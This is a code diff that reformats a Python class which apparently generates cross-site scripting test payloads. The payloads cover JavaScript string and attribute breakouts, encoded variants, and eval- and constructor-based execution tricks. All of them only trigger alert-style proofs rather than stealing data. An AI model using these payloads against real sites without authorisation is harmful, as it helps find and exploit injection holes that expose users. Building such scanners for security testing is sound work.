@@ -66,41 +66,49 @@ class ContextPayloadGenerator:
             # We need to break out of the JS string AND neutralize the tail
             if quote_char == '"':
                 # Inside double-quoted attribute with single-quoted JS string
-                payloads.extend([
-                    "');alert(1);//",
-                    "');alert(document.domain);//",
-                    "');confirm(1);//",
-                    "');prompt(1);//",
-                    "'));alert(1);//",  # Double close for nested calls
-                    "',alert(1));//",   # Comma operator
-                    "'+alert(1)+('",    # Expression-based
-                ])
+                payloads.extend(
+                    [
+                        "');alert(1);//",
+                        "');alert(document.domain);//",
+                        "');confirm(1);//",
+                        "');prompt(1);//",
+                        "'));alert(1);//",  # Double close for nested calls
+                        "',alert(1));//",  # Comma operator
+                        "'+alert(1)+('",  # Expression-based
+                    ]
+                )
             else:
                 # Inside single-quoted attribute
-                payloads.extend([
-                    '");alert(1);//',
-                    '");alert(document.domain);//',
-                    '");confirm(1);//',
-                    '"));alert(1);//',
-                    '",alert(1));//',
-                    '"+alert(1)+("',
-                ])
-            
+                payloads.extend(
+                    [
+                        '");alert(1);//',
+                        '");alert(document.domain);//',
+                        '");confirm(1);//',
+                        '"));alert(1);//',
+                        '",alert(1));//',
+                        '"+alert(1)+("',
+                    ]
+                )
+
             # HTML entity encoded versions (browser decodes before JS execution)
-            payloads.extend([
-                "&#39;);alert(1);//",      # &#39; = '
-                "&#x27;);alert(1);//",     # &#x27; = '
-                "&apos;);alert(1);//",     # &apos; = '
-                "&#34;);alert(1);//",      # &#34; = "
-                "&#x22;);alert(1);//",     # &#x22; = "
-            ])
-            
+            payloads.extend(
+                [
+                    "&#39;);alert(1);//",  # &#39; = '
+                    "&#x27;);alert(1);//",  # &#x27; = '
+                    "&apos;);alert(1);//",  # &apos; = '
+                    "&#34;);alert(1);//",  # &#34; = "
+                    "&#x22;);alert(1);//",  # &#x22; = "
+                ]
+            )
+
             # If we know it's a function call context
             if is_in_function_call:
-                payloads.extend([
-                    "');alert(1);('",      # Balance quotes
-                    "');alert(1);var x='", # Variable assignment
-                ])
+                payloads.extend(
+                    [
+                        "');alert(1);('",  # Balance quotes
+                        "');alert(1);var x='",  # Variable assignment
+                    ]
+                )
 
         # Standard quote escape payloads (break out of attribute)
         if quote_char == '"':
@@ -166,7 +174,7 @@ class ContextPayloadGenerator:
     def get_js_string_payloads(self, context_info: Mapping[str, Any]) -> list[str]:
         """
         Get JavaScript string context payloads.
-        
+
         All payloads end with // to neutralize the tail of the template.
         For example: startTimer('{{ timer }}');
         Payload: ');alert(1);//
@@ -176,70 +184,67 @@ class ContextPayloadGenerator:
         quote_char = context_info.get("quote_char", '"')
         is_in_function_call = context_info.get("is_in_function_call", False)
         is_in_event_handler = context_info.get("is_in_event_handler", False)
-        
+
         payloads = []
-        
+
         # Primary payloads - close string, close function call (if any), execute, comment tail
         if is_in_function_call or is_in_event_handler:
             # For function calls like: func('USER_INPUT');
             # Need to close: ' + ) + ; then execute + comment
-            payloads.extend([
-                f"{quote_char});alert(1);//",
-                f"{quote_char});alert(document.domain);//",
-                f"{quote_char});confirm(1);//",
-                f"{quote_char});prompt(1);//",
-                f"{quote_char});console.log(1);//",
-                # Variations with different closures
-                f"{quote_char}));alert(1);//",  # Double close for nested calls
-                f"{quote_char},alert(1));//",   # Comma operator inside call
-                f"{quote_char})+alert(1);//",   # Expression after close
-            ])
-        
+            payloads.extend(
+                [
+                    f"{quote_char});alert(1);//",
+                    f"{quote_char});alert(document.domain);//",
+                    f"{quote_char});confirm(1);//",
+                    f"{quote_char});prompt(1);//",
+                    f"{quote_char});console.log(1);//",
+                    # Variations with different closures
+                    f"{quote_char}));alert(1);//",  # Double close for nested calls
+                    f"{quote_char},alert(1));//",  # Comma operator inside call
+                    f"{quote_char})+alert(1);//",  # Expression after close
+                ]
+            )
+
         # Standard string breakout payloads - all with tail neutralization
-        payloads.extend([
-            # Basic breakout with comment
-            f"{quote_char};alert(1);//",
-            f"{quote_char};alert(document.domain);//",
-            f"{quote_char};confirm(1);//",
-            f"{quote_char};prompt(1);//",
-            
-            # Expression-based (for cases where ; might be filtered)
-            f"{quote_char}+alert(1)+{quote_char}",
-            f"{quote_char}-alert(1)-{quote_char}",
-            f"{quote_char}*alert(1)*{quote_char}",
-            f"{quote_char}||alert(1)||{quote_char}",
-            f"{quote_char}&&alert(1)&&{quote_char}",
-            
-            # With variable assignment to balance
-            f"{quote_char};alert(1);var x={quote_char}",
-            f"{quote_char};alert(1);let x={quote_char}",
-            
-            # Newline-based (URL encoded)
-            f"{quote_char}%0aalert(1)//",
-            f"{quote_char}%0dalert(1)//",
-            f"{quote_char}%0a%0dalert(1)//",
-            
-            # With comment insertion
-            f"{quote_char}/**/;alert(1);//",
-            f"{quote_char};/**/alert(1);//",
-            
-            # Advanced execution methods
-            f'{quote_char};eval("alert(1)");//',
-            f'{quote_char};setTimeout("alert(1)",0);//',
-            f'{quote_char};setInterval("alert(1)",1);//',
-            f'{quote_char};Function("alert(1)")();//',
-            f'{quote_char};[].constructor.constructor("alert(1)")();//',
-            
-            # Unicode/hex escapes
-            f"{quote_char}\\x3balert(1);//",
-            f"{quote_char}\\u003balert(1);//",
-            f"{quote_char}\\073alert(1);//",
-            
-            # HTML entity encoded (for HTML attribute context)
-            f"{quote_char}&#x27;);alert(1);//",
-            f"{quote_char}&#39;);alert(1);//",
-        ])
-        
+        payloads.extend(
+            [
+                # Basic breakout with comment
+                f"{quote_char};alert(1);//",
+                f"{quote_char};alert(document.domain);//",
+                f"{quote_char};confirm(1);//",
+                f"{quote_char};prompt(1);//",
+                # Expression-based (for cases where ; might be filtered)
+                f"{quote_char}+alert(1)+{quote_char}",
+                f"{quote_char}-alert(1)-{quote_char}",
+                f"{quote_char}*alert(1)*{quote_char}",
+                f"{quote_char}||alert(1)||{quote_char}",
+                f"{quote_char}&&alert(1)&&{quote_char}",
+                # With variable assignment to balance
+                f"{quote_char};alert(1);var x={quote_char}",
+                f"{quote_char};alert(1);let x={quote_char}",
+                # Newline-based (URL encoded)
+                f"{quote_char}%0aalert(1)//",
+                f"{quote_char}%0dalert(1)//",
+                f"{quote_char}%0a%0dalert(1)//",
+                # With comment insertion
+                f"{quote_char}/**/;alert(1);//",
+                f"{quote_char};/**/alert(1);//",
+                # Advanced execution methods
+                f'{quote_char};eval("alert(1)");//',
+                f'{quote_char};setTimeout("alert(1)",0);//',
+                f'{quote_char};setInterval("alert(1)",1);//',
+                f'{quote_char};Function("alert(1)")();//',
+                f'{quote_char};[].constructor.constructor("alert(1)")();//',
+                # Unicode/hex escapes
+                f"{quote_char}\\x3balert(1);//",
+                f"{quote_char}\\u003balert(1);//",
+                f"{quote_char}\\073alert(1);//",
+                # HTML entity encoded (for HTML attribute context)
+                f"{quote_char}&#x27;);alert(1);//",
+                f"{quote_char}&#39;);alert(1);//",
+            ]
+        )
+
         return payloads
 
     def get_css_payloads(self) -> list[str]:
